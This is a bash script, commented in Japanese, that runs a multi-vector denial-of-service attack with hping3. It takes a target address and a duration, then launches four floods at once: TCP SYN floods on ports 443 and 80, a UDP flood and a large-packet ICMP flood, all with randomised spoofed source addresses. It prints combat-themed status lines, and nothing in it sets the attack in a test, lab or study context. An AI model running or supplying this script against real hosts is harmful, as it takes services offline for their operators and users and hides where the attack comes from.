#!/bin/bash
# 引数の取得（デフォルト値を設定）
TARGET=${1:-"127.0.0.1"}
DURATION=${2:-"15"}

# 実行権限チェック
if [ "$EUID" -ne 0 ]; then 
  echo "[!] WARNING: This script requires root privileges for hping3."
fi

echo "=========================================="
echo "[*] TARGET: $TARGET"
echo "[*] DURATION: ${DURATION}s"
echo "=========================================="

echo "[*] LAUNCHING 4 PARALLEL VECTORS..."

# 1. TCP SYN Flood (Port 443)
timeout ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID1=$!
echo "[+] Vector 1 (TCP/443) Fired (PID: $PID1)"

# 2. TCP SYN Flood (Port 80)
timeout ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID2=$!
echo "[+] Vector 2 (TCP/80)  Fired (PID: $PID2)"

# 3. UDP Flood
timeout ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
PID3=$!
echo "[+] Vector 3 (UDP)     Fired (PID: $PID3)"

# 4. ICMP Large Packet Flood
timeout ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
PID4=$!
echo "[+] Vector 4 (ICMP)    Fired (PID: $PID4)"

echo "------------------------------------------"
echo "[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s..."

wait $PID1 $PID2 $PID3 $PID4
echo "[*] CEASE FIRE. ATTACK COMPLETE."
